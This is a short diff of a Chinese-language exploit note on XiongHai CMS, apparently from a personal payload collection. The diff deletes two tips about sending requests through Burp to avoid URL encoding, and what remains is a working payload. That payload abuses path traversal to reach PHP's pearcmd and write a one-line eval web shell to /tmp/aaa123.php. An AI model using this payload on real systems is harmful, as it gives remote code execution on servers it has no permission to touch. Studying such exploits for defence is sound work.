@@ -1,7 +1,5 @@
 # 熊海CMS pearcmd
 
-* 用burp发, exp_xionghai_cms.py
-* 不要用 浏览器和request 库会自动url编码。
 ```bash
 # payload1
 /?+config-create+/&r=../../../../../../../../../usr/share/pear/pearcmd&<?=eval($_REQUEST[1]);?>+/tmp/aaa123.php
